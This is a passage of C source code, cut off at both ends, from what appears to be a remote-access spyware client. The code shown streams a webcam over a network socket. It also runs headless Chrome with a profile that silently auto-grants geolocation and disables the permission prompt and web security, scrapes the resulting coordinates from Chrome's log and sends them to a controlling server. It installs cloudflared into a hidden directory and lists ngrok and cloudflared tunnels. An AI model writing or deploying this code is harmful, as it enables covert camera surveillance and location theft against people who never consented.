            perror("VIDIOC_QUERYBUF");
            free(buffers);
            buffers = NULL;
            close(video_fd);
            video_fd = -1;
            return 0;
        }

        buffers[n_buffers].length = buf.length;
        buffers[n_buffers].start = mmap(NULL, buf.length, PROT_READ | PROT_WRITE, MAP_SHARED, video_fd, buf.m.offset);
        if (buffers[n_buffers].start == MAP_FAILED) {
            perror("mmap buffer");
            for (int i = 0; i < n_buffers; ++i) {
                if (buffers[i].start && buffers[i].length > 0) {
                    munmap(buffers[i].start, buffers[i].length);
                }
            }
            free(buffers);
            buffers = NULL;
            close(video_fd);
            video_fd = -1;
            return 0;
        }

        if (ioctl(video_fd, VIDIOC_QBUF, &buf) < 0) {
            perror("VIDIOC_QBUF");
            for (int i = 0; i <= n_buffers; ++i) {
                if (buffers[i].start && buffers[i].length > 0) {
                    munmap(buffers[i].start, buffers[i].length);
                }
            }
            free(buffers);
            buffers = NULL;
            close(video_fd);
            video_fd = -1;
            return 0;
        }
    }

    enum v4l2_buf_type type = V4L2_BUF_TYPE_VIDEO_CAPTURE;
    if (ioctl(video_fd, VIDIOC_STREAMON, &type) < 0) {
        perror("VIDIOC_STREAMON");
        for (int i = 0; i < n_buffers; ++i) {
            if (buffers[i].start && buffers[i].length > 0) {
                munmap(buffers[i].start, buffers[i].length);
            }
        }
        free(buffers);
        buffers = NULL;
        close(video_fd);
        video_fd = -1;
        return 0;
    }
#endif
    return 1;
}

#ifdef _WIN32
unsigned __stdcall stream_video_background(void *arg) {
    (void)arg; // unused parameter
#else
void stream_video_background() {
#endif
    
#ifdef _WIN32
    if (WSAStartup(MAKEWORD(2, 2), &wsa_data) != 0) {
        fprintf(stderr, "WSAStartup failed\n");
        return 0;
    }
    SetConsoleCtrlHandler(console_handler, TRUE);
#else
    signal(SIGPIPE, SIG_IGN);
    signal(SIGINT, handle_sigint);
#endif

#ifndef _WIN32
    if (!init_video()) {
        fprintf(stderr, "Video init failed\n");
        cleanup_video();
        return;
    }
#endif

    stream_server_fd = socket(AF_INET, SOCK_STREAM, 0);
    if (stream_server_fd == INVALID_FD) {
        perror("socket");
        cleanup_video();
#ifdef _WIN32
        return 0;
#else
        return;
#endif
    }

    int opt = 1;
    setsockopt(stream_server_fd, SOL_SOCKET, SO_REUSEADDR, (char*)&opt, sizeof(opt));

    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(VIDEO_PORT);
    addr.sin_addr.s_addr = INADDR_ANY;

    if (bind(stream_server_fd, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
        perror("bind");
        cleanup_video();
#ifdef _WIN32
        return 0;
#else
        return;
#endif
    }

    if (listen(stream_server_fd, MAX_CLIENTS) < 0) {
        perror("listen");
        cleanup_video();
#ifdef _WIN32
        return 0;
#else
        return;
#endif
    }

    printf("Streaming on http://localhost:%d\n", VIDEO_PORT);

    while (streaming_active) {
        socket_t client_fd = accept(stream_server_fd, NULL, NULL);
        if (client_fd == INVALID_FD) {
#ifdef _WIN32
            int err = WSAGetLastError();
            if (err == WSAEINTR) continue;
            fprintf(stderr, "accept failed: %d\n", err);
            break;
#else
            if (errno == EINTR) continue;
            perror("accept");
            break;
#endif
        }

#ifdef _WIN32
        {
            DWORD timeout_ms = 5000;
            setsockopt(client_fd, SOL_SOCKET, SO_RCVTIMEO, (const char*)&timeout_ms, sizeof(timeout_ms));
        }
#else
        {
            struct timeval tv;
            tv.tv_sec = 5;
            tv.tv_usec = 0;
            setsockopt(client_fd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
        }
#endif

        socket_t *client_ptr = malloc(sizeof(socket_t));
        if (!client_ptr) {
            close_socket(client_fd);
            continue;
        }
        *client_ptr = client_fd;

#ifdef _WIN32
        uintptr_t th = _beginthreadex(NULL, 0, client_thread, client_ptr, 0, NULL);
        if (!th) {
            close_socket(client_fd);
            free(client_ptr);
        } else {
            CloseHandle((HANDLE)th);
        }
#else
        pthread_t tid;
        if (pthread_create(&tid, NULL, client_thread, client_ptr) != 0) {
            perror("pthread_create");
            close_socket(client_fd);
            free(client_ptr);
        } else {
            pthread_detach(tid);
        }
#endif
    }

    cleanup_video();
#ifdef _WIN32
    return 0;
#endif
}

void run_video_stream(char **args) {
    printf("\n[Video Streaming]\n");
    
    if (streaming_active) {
        printf("Video streaming is already active\n");
        return;
    }
    
    printf("Starting video streaming server...\n");
    printf("Stream will run for 10 seconds and then continue in background\n");
    printf("Use 'stop stream' to stop the streaming\n");
    
    streaming_active = 1;
    
    // Start streaming in a background thread
#ifdef _WIN32
    uintptr_t th = _beginthreadex(NULL, 0, (_beginthreadex_proc_type)stream_video_background, NULL, 0, NULL);
    if (!th) {
        printf("Failed to start streaming thread\n");
        streaming_active = 0;
        return;
    }
    CloseHandle((HANDLE)th);
#else
    if (pthread_create(&stream_thread, NULL, (void *(*)(void *))stream_video_background, NULL) != 0) {
        printf("Failed to start streaming thread\n");
        streaming_active = 0;
        return;
    }
    pthread_detach(stream_thread);
#endif
    
    // Wait for 10 seconds
    printf("Streaming for 10 seconds...\n");
    sleep(10);
    
    printf("Initial streaming period complete. Stream continues in background.\n");
    printf("You can now run other commands while streaming continues.\n");
}

void stop_stream(char **args) {
    printf("\n[Stop Video Stream]\n");
    
    if (!streaming_active) {
        printf("Video streaming is not active\n");
        return;
    }
    
    streaming_active = 0;
    
    // Wait for the streaming thread to finish
    if (stream_thread) {
        pthread_join(stream_thread, NULL);
    }
    
    printf("Video streaming stopped\n");
}

// ==================== GEOLOCATION FUNCTIONS ====================

void cleanup_chrome_profile() {
    printf("[*] Cleaning up old Chrome profile...\n");
    
#ifdef _WIN32
    char cmd[512];
    snprintf(cmd, sizeof(cmd), "rmdir /s /q \"%s\\chrome_geo\" 2>%s", TEMP_DIR, NULL_DEVICE);
    system(cmd);
    snprintf(cmd, sizeof(cmd), "mkdir \"%s\\chrome_geo\\Default\" 2>%s", TEMP_DIR, NULL_DEVICE);
    system(cmd);
#else
    char cmd[512];
    snprintf(cmd, sizeof(cmd), "rm -rf %s/chrome_geo", TEMP_DIR);
    system(cmd);
    snprintf(cmd, sizeof(cmd), "mkdir -p %s/chrome_geo/Default", TEMP_DIR);
    system(cmd);
#endif
}

// Update the create_chrome_preferences function to enable logging
void create_chrome_preferences() {
    char prefs_path[512];
    snprintf(prefs_path, sizeof(prefs_path), "%s%schrome_geo%sDefault%sPreferences", 
             TEMP_DIR, PATH_SEP, PATH_SEP, PATH_SEP);
    
    FILE *prefs = fopen(prefs_path, "w");
    if (prefs) {
        const char *prefs_json = 
            "{\n"
            "   \"profile\": {\n"
            "      \"content_settings\": {\n"
            "         \"exceptions\": {\n"
            "            \"geolocation\": {\n"
            "               \"file://*\": {\n"
            "                  \"last_modified\": \"13366681774987842\",\n"
            "                  \"setting\": 1\n"
            "               }\n"
            "            }\n"
            "         }\n"
            "      },\n"
            "      \"default_content_setting_values\": {\n"
            "         \"geolocation\": 1\n"
            "      }\n"
            "   },\n"
            "   \"logging\": {\n"
            "      \"level\": 1\n"
            "   }\n"
            "}\n";
        fputs(prefs_json, prefs);
        fclose(prefs);
        printf("[*] Created Chrome preferences with geolocation auto-allow and logging enabled\n");
    }
}

void create_test_page() {
    char html_path[512];
    snprintf(html_path, sizeof(html_path), "%s%sgeo_test.html", TEMP_DIR, PATH_SEP);
    
    FILE *f = fopen(html_path, "w");
    if (f) {
        const char *html = 
            "<!DOCTYPE html>\n"
            "<html>\n"
            "<head>\n"
            "    <title>Personal Geo Logger</title>\n"
            "    <style>\n"
            "        body { font-family: Arial, sans-serif; margin: 50px; background: #1a1a1a; color: #fff; }\n"
            "        .success { color: #00ff00; }\n"
            "        .error { color: #ff0000; }\n"
            "        button { padding: 10px 20px; font-size: 16px; margin: 10px 0; background: #333; color: #fff; border: 1px solid #555; cursor: pointer; }\n"
            "        pre { background: #000; padding: 10px; border: 1px solid #333; }\n"
            "        .status { margin: 20px 0; padding: 10px; background: #333; border-radius: 5px; }\n"
            "    </style>\n"
            "</head>\n"
            "<body>\n"
            "    <h1>Personal Geolocation Logger</h1>\n"
            "    <div class=\"status\" id=\"status\">Starting...</div>\n"
            "    <div id=\"result\"></div>\n"
            "    <button onclick=\"getLocation()\">Get Current Location</button>\n"
            "    <button onclick=\"toggleAutoUpdate()\">Toggle Auto-Update</button>\n"
            "    <div id=\"log\"></div>\n"
            "    <script>\n"
            "        let logs = [];\n"
            "        let autoUpdate = true;\n"
            "        let updateInterval;\n"
            "        \n"
            "        function writeToSignalFile(message) {\n"
            "            try {\n"
            "                // Try multiple methods to communicate with the C program\n"
            "                console.log(`GEOLOG: ${message}`);\n"
            "                document.title = `GEOLOG: ${message}`;\n"
            "                \n"
            "                // Create a temporary element to trigger file access\n"
            "                const link = document.createElement('a');\n"
            "                const blob = new Blob([message], {type: 'text/plain'});\n"
            "                link.href = URL.createObjectURL(blob);\n"
            "                link.download = 'geo_log_signal.txt';\n"
            "                \n"
            "                // Also try localStorage as a backup communication method\n"
            "                if (typeof(Storage) !== 'undefined') {\n"
            "                    localStorage.setItem('geoLog', message);\n"
            "                    localStorage.setItem('geoTimestamp', Date.now().toString());\n"
            "                }\n"
            "            } catch(e) {\n"
            "                console.log('Signal write failed:', e);\n"
            "            }\n"
            "        }\n"
            "        \n"
            "        function addLog(message) {\n"
            "            const timestamp = new Date().toISOString();\n"
            "            const logEntry = `[${timestamp}] ${message}`;\n"
            "            logs.push(logEntry);\n"
            "            \n"
            "            writeToSignalFile(message);\n"
            "            \n"
            "            const logDiv = document.getElementById('log');\n"
            "            logDiv.innerHTML = '<h3>Activity Log:</h3><pre>' + logs.slice(-15).join('\\n') + '</pre>';\n"
            "        }\n"
            "        \n"
            "        function getLocation() {\n"
            "            document.getElementById('status').innerHTML = 'Requesting location...';\n"
            "            document.getElementById('result').innerHTML = '';\n"
            "            addLog('Location request initiated');\n"
            "            \n"
            "            if (navigator.geolocation) {\n"
            "                const options = {\n"
            "                    enableHighAccuracy: true,\n"
            "                    timeout: 15000,\n"
            "                    maximumAge: 0\n"
            "                };\n"
            "                navigator.geolocation.getCurrentPosition(showPosition, showError, options);\n"
            "            } else {\n"
            "                const msg = 'Geolocation not supported by this browser';\n"
            "                document.getElementById('result').innerHTML = '<p class=\"error\">' + msg + '</p>';\n"
            "                document.getElementById('status').innerHTML = 'Not supported';\n"
            "                addLog('ERROR: ' + msg);\n"
            "            }\n"
            "        }\n"
            "        \n"
            "        function showPosition(position) {\n"
            "            const lat = position.coords.latitude;\n"
            "            const lon = position.coords.longitude;\n"
            "            const accuracy = position.coords.accuracy;\n"
            "            const altitude = position.coords.altitude;\n"
            "            const heading = position.coords.heading;\n"
            "            const speed = position.coords.speed;\n"
            "            const timestamp = position.timestamp;\n"
            "            \n"
            "            let result = `\n"
            "                <div class=\"success\">\n"
            "                    <h3>Location Retrieved:</h3>\n"
            "                    <p><strong>Latitude:</strong> ${lat}</p>\n"
            "                    <p><strong>Longitude:</strong> ${lon}</p>\n"
            "                    <p><strong>Accuracy:</strong> ${accuracy} meters</p>\n"
            "            `;\n"
            "            \n"
            "            if (altitude !== null) result += `<p><strong>Altitude:</strong> ${altitude} meters</p>`;\n"
            "            if (heading !== null) result += `<p><strong>Heading:</strong> ${heading}°</p>`;\n"
            "            if (speed !== null) result += `<p><strong>Speed:</strong> ${speed} m/s</p>`;\n"
            "            \n"
            "            result += `<p><strong>Timestamp:</strong> ${new Date(timestamp).toLocaleString()}</p></div>`;\n"
            "            \n"
            "            document.getElementById('result').innerHTML = result;\n"
            "            document.getElementById('status').innerHTML = 'Location acquired successfully!';\n"
            "            \n"
            "            const logMessage = `SUCCESS: LAT=${lat}, LON=${lon}, ACC=${accuracy}m`;\n"
            "            addLog(logMessage);\n"
            "        }\n"
            "        \n"
            "        function showError(error) {\n"
            "            let msg = '';\n"
            "            switch(error.code) {\n"
            "                case error.PERMISSION_DENIED:\n"
            "                    msg = 'Location access denied by user';\n"
            "                    break;\n"
            "                case error.POSITION_UNAVAILABLE:\n"
            "                    msg = 'Location information unavailable';\n"
            "                    break;\n"
            "                case error.TIMEOUT:\n"
            "                    msg = 'Location request timed out';\n"
            "                    break;\n"
            "                default:\n"
            "                    msg = 'Unknown geolocation error';\n"
            "            }\n"
            "            \n"
            "            document.getElementById('result').innerHTML = '<p class=\"error\">Error: ' + msg + '</p>';\n"
            "            document.getElementById('status').innerHTML = 'Location request failed';\n"
            "            \n"
            "            addLog(`ERROR: ${msg} (Code: ${error.code})`);\n"
            "        }\n"
            "        \n"
            "        function toggleAutoUpdate() {\n"
            "            autoUpdate = !autoUpdate;\n"
            "            if (autoUpdate) {\n"
            "                updateInterval = setInterval(getLocation, 60000); // Every 60 seconds\n"
            "                addLog('Auto-update enabled (60s interval)');\n"
            "            } else {\n"
            "                clearInterval(updateInterval);\n"
            "                addLog('Auto-update disabled');\n"
            "            }\n"
            "        }\n"
            "        \n"
            "        // Initialize on page load\n"
            "        window.onload = function() {\n"
            "            addLog('Personal geolocation logger started');\n"
            "            \n"
            "            // Initial location request\n"
            "            setTimeout(getLocation, 2000);\n"
            "            \n"
            "            // Start auto-update\n"
            "            if (autoUpdate) {\n"
            "                updateInterval = setInterval(getLocation, 60000);\n"
            "            }\n"
            "        };\n"
            "        \n"
            "        // Handle page unload\n"
            "        window.onbeforeunload = function() {\n"
            "            addLog('Page closing - geolocation logger stopped');\n"
            "        };\n"
            "    </script>\n"
            "</body>\n"
            "</html>";
        fputs(html, f);
        fclose(f);
        printf("[*] Created test page: %s\n", html_path);
    }
}

#ifdef _WIN32
unsigned __stdcall monitor_logs_thread_func(void* arg) {
    (void)arg;
    monitor_logs();
    return 0;
}
#endif

// Modify run_geolocation to capture Chrome's console output
void run_geolocation(char **args) {
    printf("\n[Geolocation Tracker]\n");
    printf("[*] Platform: ");
    
#ifdef _WIN32
    printf("Windows\n");
#else
    printf("Unix/Linux/macOS\n");
#endif
    
    // Reset logs buffer
    pthread_mutex_lock(&geo_logs_mutex);
    strcpy(geo_logs, "");
    pthread_mutex_unlock(&geo_logs_mutex);
    
    char cmd[256];
#ifdef _WIN32
    snprintf(cmd, sizeof(cmd), "mkdir \"%s\" 2>%s", TEMP_DIR, NULL_DEVICE);
#else
    snprintf(cmd, sizeof(cmd), "mkdir -p %s", TEMP_DIR);
#endif
    system(cmd);
    
    // Create log file path
    snprintf(chrome_log_path, sizeof(chrome_log_path), "%s%schrome_geo.log", TEMP_DIR, PATH_SEP);
    
    cleanup_chrome_profile();
    create_chrome_preferences();
    create_test_page();
    
    printf("[*] Starting Chrome in headless mode...\n");
    
#ifdef _WIN32
    char user_data_dir[512];
    char html_path[512];
    
    snprintf(user_data_dir, sizeof(user_data_dir), "%s\\chrome_geo", TEMP_DIR);
    snprintf(html_path, sizeof(html_path), "file:///%s/geo_test.html", TEMP_DIR);
    
    const char* chrome_paths[] = {
        "chrome.exe",
        "google-chrome.exe",
        "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
        "C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe",
        NULL
    };
    
    char chrome_cmd[2048];
    snprintf(chrome_cmd, sizeof(chrome_cmd),
        "\"%s\" --headless --no-sandbox --disable-gpu --disable-dev-shm-usage "
        "--user-data-dir=\"%s\" --disable-web-security --allow-running-insecure-content "
        "--enable-logging --log-level=0 --enable-geolocation "
        "--disable-geolocation-prompt --allow-file-access-from-files "
        "--disable-background-timer-throttling --disable-backgrounding-occluded-windows "
        "--log-file=\"%s\" \"%s\"", 
        chrome_paths[2], user_data_dir, chrome_log_path, html_path);
    
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));
    
    if (CreateProcess(NULL, chrome_cmd, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
        chrome_pid = pi.hProcess;
        CloseHandle(pi.hThread);
        printf("[*] Chrome started successfully\n");
    } else {
        printf("[!] Failed to start Chrome. Make sure Google Chrome is installed.\n");
        printf("[!] Tried: %s\n", chrome_cmd);
        return;
    }
#else
    chrome_pid = fork();
    if (chrome_pid == 0) {
        char user_data_dir[512];
        char html_path[512];
        
        snprintf(user_data_dir, sizeof(user_data_dir), "%s/chrome_geo", TEMP_DIR);
        snprintf(html_path, sizeof(html_path), "file://%s/geo_test.html", TEMP_DIR);
        
        const char* chrome_names[] = {
            "google-chrome", "chromium-browser", "chromium", "chrome", NULL
        };
        
        char user_data_arg[600];
        snprintf(user_data_arg, sizeof(user_data_arg), "--user-data-dir=%s", user_data_dir);
        
        // Redirect stdout and stderr to our log file
        freopen(chrome_log_path, "w", stdout);
        freopen(chrome_log_path, "w", stderr);
        
        for (int i = 0; chrome_names[i] != NULL; i++) {
            execlp(chrome_names[i], chrome_names[i],
                "--headless",
                "--no-sandbox",
                "--disable-gpu",
                "--disable-dev-shm-usage",
                user_data_arg,
                "--disable-web-security",
                "--allow-running-insecure-content",
                "--enable-logging=stderr",
                "--log-level=0",
                "--enable-geolocation",
                "--disable-geolocation-prompt",
                "--allow-file-access-from-files",
                "--disable-background-timer-throttling",
                "--disable-backgrounding-occluded-windows",
                "--disable-renderer-backgrounding",
                html_path,
                NULL);
        }
        
        printf("[!] Failed to start Chrome/Chromium\n");
        exit(1);
    }
#endif

#ifdef _WIN32
    if (chrome_pid != NULL) {
#else
    if (chrome_pid > 0) {
#endif
        printf("[*] Chrome launched successfully\n");
        printf("[*] Personal geolocation test running for 10 seconds...\n");
        printf("[*] Monitoring for location data...\n");
        
#ifdef _WIN32
        uintptr_t th = _beginthreadex(NULL, 0, monitor_logs_thread_func, NULL, 0, NULL);
        if (th) {
            monitor_pid = (HANDLE)th;
        }
#else
        monitor_pid = fork();
        if (monitor_pid == 0) {
            monitor_logs();
            exit(0);
        }
#endif
        
        // Wait for 10 seconds
        sleep(10);
        
        printf("\n[*] Geolocation tracking completed\n");
        
        // Send captured logs to server
        pthread_mutex_lock(&geo_logs_mutex);
        if (strlen(geo_logs) > 0) {
            printf("[*] Sending geolocation logs to server...\n");
            if (connected_to_server) {
                send_data_to_server("GEOLOCATION_LOGS_START\n");
                send_data_to_server(geo_logs);
                send_data_to_server("\nGEOLOCATION_LOGS_END\n");
            }
            printf("[*] Logs sent successfully\n");
            printf("[*] Captured logs:\n%s\n", geo_logs);
        } else {
            printf("[*] No geolocation logs captured\n");
        }
        pthread_mutex_unlock(&geo_logs_mutex);
        
#ifdef _WIN32
        if (monitor_pid != NULL) {
            TerminateProcess(monitor_pid, 0);
            CloseHandle(monitor_pid);
            monitor_pid = NULL;
        }
        
        if (chrome_pid != NULL) {
            TerminateProcess(chrome_pid, 0);
            CloseHandle(chrome_pid);
            chrome_pid = NULL;
        }
#else
        if (monitor_pid > 0) {
            kill(monitor_pid, SIGTERM);
            waitpid(monitor_pid, NULL, WNOHANG);
            monitor_pid = 0;
        }
        
        if (chrome_pid > 0) {
            kill(chrome_pid, SIGTERM);
            waitpid(chrome_pid, NULL, WNOHANG);
            chrome_pid = 0;
        }
#endif
    } else {
        printf("[!] Failed to start Chrome. Please ensure Google Chrome or Chromium is installed.\n");
        return;
    }
}

// Modify monitor_logs to capture the complete geolocation message
void monitor_logs() {
    printf("[*] Starting log monitor...\n");
    
    time_t start_time = time(NULL);
    time_t current_time;
    
    while ((current_time = time(NULL)) - start_time < 10) { // Run for 10 seconds
        // Read Chrome's log file
        FILE *logFile = fopen(chrome_log_path, "r");
        if (logFile) {
            char line[2048]; // Increased buffer size
            while (fgets(line, sizeof(line), logFile)) {
                // Look for GEOLOG: in the line
                if (strstr(line, "GEOLOG:")) {
                    // Extract the complete message inside quotes
                    char *start_quote = strchr(line, '"');
                    if (start_quote) {
                        char *end_quote = NULL;
                        char *next_quote = start_quote + 1;
                        
                        // Find the matching end quote by looking for the pattern
                        while (*next_quote && !end_quote) {
                            if (*next_quote == '"' && 
                                *(next_quote + 1) == ',' && 
                                strstr(next_quote, ", source:")) {
                                end_quote = next_quote;
                                break;
                            }
                            next_quote++;
                        }
                        
                        if (end_quote) {
                            *end_quote = '\0'; // Terminate at the end quote
                            char *message = start_quote + 1; // Skip the opening quote
                            
                            // Verify this is a geolocation message
                            if (strstr(message, "GEOLOG:")) {
                                // Capture the complete message
                                pthread_mutex_lock(&geo_logs_mutex);
                                strncat(geo_logs, message, sizeof(geo_logs) - strlen(geo_logs) - 1);
                                strcat(geo_logs, "\n");
                                pthread_mutex_unlock(&geo_logs_mutex);
                                
                                printf("\n[GEOLOCATION] %s", message);
                                fflush(stdout);
                            }
                        }
                    }
                }
            }
            fclose(logFile);
        }
        
        usleep(500000); // Check every 500ms
    }
    
    printf("\n[*] Geolocation monitoring completed after 10 seconds\n");
}

// Add this implementation after the run_geolocation function
void geo_signal_handler(int sig) {
    printf("\n[*] Geolocation interrupted. Exiting...\n");
    exit(0);
}

void signal_handler(int sig) {
    printf("\n[*] Shutting down...\n");
    cleanup_video();
    exit(0);
}

// ==================== TUNNEL FUNCTIONS ====================

// Get install directory for cloudflared
static void get_install_dir(char *buf, size_t len) {
#ifdef _WIN32
    const char *base = getenv("LOCALAPPDATA");
    if (!base) base = getenv("USERPROFILE");
    if (!base) base = ".";
    snprintf(buf, len, "%s%s", base, HIDDEN_DIR);
#else
    const char *home = getenv("HOME");
    if (!home) {
        struct passwd *pw = getpwuid(getuid());
        if (pw) home = pw->pw_dir;
    }
    if (!home) home = ".";
    snprintf(buf, len, "%s%s", home, HIDDEN_DIR);
#endif
}

// Check if a directory exists, create if not
static bool ensure_dir_exists(const char *path) {
#ifdef _WIN32
    if (PathFileExistsA(path)) return true;
    return (CreateDirectoryA(path, NULL) || GetLastError() == ERROR_ALREADY_EXISTS);
#else
    struct stat st;
    if (stat(path, &st) == 0) return S_ISDIR(st.st_mode);
    return (mkdir(path, 0700) == 0);
#endif
}

// Make file executable on Unix
static void make_executable_if_unix(const char *path) {
#ifndef _WIN32
    chmod(path, 0700);
#endif
}

// Check if a command exists in PATH
static bool command_exists(const char *cmd) {
#ifdef _WIN32
    char path[MAX_PATH];
    DWORD ret = SearchPathA(NULL, cmd, ".exe", MAX_PATH, path, NULL);
    return (ret > 0 && ret < MAX_PATH);
#else
    char *path = getenv("PATH");
    if (!path) return false;
    
    char *p = strdup(path);
    char *tok = strtok(p, ":");
    bool found = false;
    
    while (tok && !found) {
        char candidate[PATH_MAX];
        snprintf(candidate, sizeof(candidate), "%s/%s", tok, cmd);
        if (access(candidate, X_OK) == 0) {
            found = true;
        }
        tok = strtok(NULL, ":");
    }
    
    free(p);
    return found;
#endif
}

// Download a file
static bool download_file(const char *url, const char *output) {
#ifdef _WIN32
    printf("[*] Downloading: %s -> %s\n", url, output);
    return (URLDownloadToFileA(NULL, url, output, 0, NULL) == S_OK);
#else
    char cmd[2048];
    if (system("command -v curl >/dev/null 2>&1") == 0) {
        snprintf(cmd, sizeof(cmd), "curl -L --fail -s -o '%s' '%s'", output, url);
        printf("[*] Running: %s\n", cmd);
        return (system(cmd) == 0);
    } else if (system("command -v wget >/dev/null 2>&1") == 0) {
        snprintf(cmd, sizeof(cmd), "wget -q -O '%s' '%s'", output, url);
        printf("[*] Running: %s\n", cmd);
        return (system(cmd) == 0);
    }
    return false;
#endif
}

// Install cloudflared
static void install_cloudflared() {
    char install_dir[1024], out_path[1200];
    get_install_dir(install_dir, sizeof(install_dir));
    printf("[*] Install directory: %s\n", install_dir);
    
    if (!ensure_dir_exists(install_dir)) {
        fprintf(stderr, "[!] Failed to create install directory\n");
        return;
    }

#ifdef _WIN32
    snprintf(out_path, sizeof(out_path), "%s\\cloudflared.exe", install_dir);
    const char *url = CLOUDFLARED_WINDOWS_URL;
#else
    snprintf(out_path, sizeof(out_path), "%s/cloudflared", install_dir);
    const char *url = CLOUDFLARED_LINUX_URL;
#endif

    if (access(out_path, F_OK) == 0) {
        printf("[*] cloudflared already present\n");
    } else {
        printf("[*] Downloading cloudflared...\n");
        if (!download_file(url, out_path)) {
            fprintf(stderr, "[!] Download failed\n");
            return;
        }
        make_executable_if_unix(out_path);
        printf("[✔] Downloaded cloudflared\n");
    }

#ifdef _WIN32
    // Add to PATH
    char path[2048];
    snprintf(path, sizeof(path), "%s;%s", getenv("PATH"), install_dir);
    _putenv_s("PATH", path);
    printf("[✔] Added to PATH for current session\n");
#else
    // Create symlink in ~/.local/bin
    char localbin[PATH_MAX];
    const char *home = getenv("HOME");
    snprintf(localbin, sizeof(localbin), "%s/.local/bin", home);
    ensure_dir_exists(localbin);
    
    char dst[PATH_MAX];
    snprintf(dst, sizeof(dst), "%s/cloudflared", localbin);
    
    unlink(dst);
    if (symlink(out_path, dst) == 0) {
        printf("[✔] Created symlink in ~/.local/bin\n");
        printf("[*] Make sure ~/.local/bin is in your PATH\n");
    }
#endif
}

// Check if a process is running
static bool is_process_running(const char *process_name) {
#ifdef _WIN32
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) return false;

    PROCESSENTRY32 process_entry;
    process_entry.dwSize = sizeof(PROCESSENTRY32);

    if (Process32First(snapshot, &process_entry)) {
        do {
            if (strcmp(process_entry.szExeFile, process_name) == 0) {
                CloseHandle(snapshot);
                return true;
            }
        } while (Process32Next(snapshot, &process_entry));
    }

    CloseHandle(snapshot);
    return false;
#else
    char cmd[256];
    snprintf(cmd, sizeof(cmd), "pgrep -x %s > /dev/null 2>&1", process_name);
    return (system(cmd) == 0);
#endif
}

// Get ngrok URL
static char* get_ngrok_url() {
    char cmd[256];
    snprintf(cmd, sizeof(cmd), "curl -s http://127.0.0.1:4040/api/tunnels 2>/dev/null");
    
    FILE *fp = popen(cmd, "r");
    if (!fp) return NULL;
    
    char response[8192] = {0};
    size_t total_read = 0;
    char line[1024];
    
    while (fgets(line, sizeof(line), fp) && total_read < sizeof(response) - 1) {
        strcat(response, line);
        total_read += strlen(line);
    }
    pclose(fp);
    
    // Parse JSON response
    char *public_url = NULL;
    char *tunnel_start = strstr(response, "\"tunnels\":[");
    if (tunnel_start) {
        char *tunnel = tunnel_start + 10;
        while ((tunnel = strstr(tunnel, "{")) != NULL) {
            char *public_url_str = strstr(tunnel, "\"public_url\":\"");
            if (public_url_str) {
                public_url_str += 14;
                char *url_end = strchr(public_url_str, '\"');
                if (url_end) {
                    *url_end = '\0';
                    public_url = strdup(public_url_str);
                    break;
                }
            }
            tunnel++;
        }
    }
    
    return public_url;
}

// Kill a process by PID
static bool kill_process(int pid) {
#ifdef _WIN32
    HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, pid);
    if (hProcess == NULL) return false;
    bool result = TerminateProcess(hProcess, 1);
    CloseHandle(hProcess);
    return result;
#else
    return (kill(pid, SIGTERM) == 0);
#endif
}

// Get list of running tunnel processes
static int get_tunnel_processes(TunnelInfo **tunnels) {
    *tunnels = NULL;
    int count = 0;
    int capacity = 10;
    *tunnels = malloc(capacity * sizeof(TunnelInfo));
    if (!*tunnels) return 0;

#ifdef _WIN32
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) return 0;

    PROCESSENTRY32 process_entry;
    process_entry.dwSize = sizeof(PROCESSENTRY32);

    if (Process32First(snapshot, &process_entry)) {
        do {
            if (strcmp(process_entry.szExeFile, "ngrok.exe") == 0 || 
                strcmp(process_entry.szExeFile, "cloudflared.exe") == 0) {
                
                if (count >= capacity) {
                    capacity *= 2;
                    *tunnels = realloc(*tunnels, capacity * sizeof(TunnelInfo));
                    if (!*tunnels) {
                        CloseHandle(snapshot);
                        return 0;
                    }
                }

                TunnelInfo *t = &(*tunnels)[count];
                t->pid = process_entry.th32ProcessID;
                t->url[0] = '\0';
                
                if (strcmp(process_entry.szExeFile, "ngrok.exe") == 0) {
                    strcpy(t->tool, "ngrok");
                    char *url = get_ngrok_url();
                    if (url) {
                        strncpy(t->url, url, sizeof(t->url) - 1);
                        t->url[sizeof(t->url) - 1] = '\0';
                        free(url);
                    }
                } else {
                    strcpy(t->tool, "cloudflared");
                }
                
                // Try to get port from command line
                HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, t->pid);
                if (hProcess) {
                    char cmdLine[1024] = {0};
                    if (GetModuleFileNameExA(hProcess, NULL, cmdLine, sizeof(cmdLine)) > 0) {
                        if (strstr(cmdLine, "http://localhost:")) {
                            char *port_start = strstr(cmdLine, "http://localhost:") + strlen("http://localhost:");
                            char *port_end = port_start;
                            while (*port_end && isdigit(*port_end)) port_end++;
                            if (port_end > port_start) {
                                size_t len = port_end - port_start;
                                if (len > sizeof(t->port) - 1) len = sizeof(t->port) - 1;
                                strncpy(t->port, port_start, len);
                                t->port[len] = '\0';
                            }
                        }
                    }
                    CloseHandle(hProcess);
                }
                
                count++;
            }
        } while (Process32Next(snapshot, &process_entry));
    }

    CloseHandle(snapshot);
#else
    // Use ps command to get process list
    FILE *fp = popen("ps -eo pid,comm,args | grep -E 'ngrok|cloudflared' | grep -v grep", "r");
    if (!fp) return 0;

    char line[2048];
    while (fgets(line, sizeof(line), fp)) {
        if (count >= capacity) {
            capacity *= 2;
            *tunnels = realloc(*tunnels, capacity * sizeof(TunnelInfo));
            if (!*tunnels) {
                pclose(fp);
                return 0;
            }
        }

        TunnelInfo *t = &(*tunnels)[count];
        t->url[0] = '\0';
        
        // Parse PID
        char *pid_str = line;
        while (isspace(*pid_str)) pid_str++;
        char *end = pid_str;
        while (*end && !isspace(*end)) end++;
        *end = '\0';
        t->pid = atoi(pid_str);
        
        // Parse command
